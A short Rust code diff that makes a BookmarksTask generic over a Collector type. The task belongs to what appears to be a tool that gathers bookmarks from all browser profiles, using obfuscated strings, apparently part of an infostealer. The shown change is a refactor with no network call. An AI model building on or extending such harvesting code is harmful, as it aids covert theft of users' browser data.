@@ -4,7 +4,6 @@ use crate::{collect_from_all_profiles, to_string_and_write_all, Bookmark};
 use alloc::sync::Arc;
 use alloc::vec;
 use alloc::vec::Vec;
-use collector::atomic::AtomicCollector;
 use collector::{Browser, Collector};
 use json::{parse, Value};
 use obfstr::obfstr as s;
@@ -21,10 +20,10 @@ impl BookmarksTask {
     }
 }
 
-impl Task for BookmarksTask {
+impl<C: Collector> Task<C> for BookmarksTask {
     parent_name!("Bookmarks.txt");
 
-    unsafe fn run(&self, parent: &Path, collector: &AtomicCollector) {
+    unsafe fn run(&self, parent: &Path, collector: &C) {
         let Some(bookmarks) = collect_from_all_profiles(&self.browser.profiles, read_bookmarks) else {
             return
         };
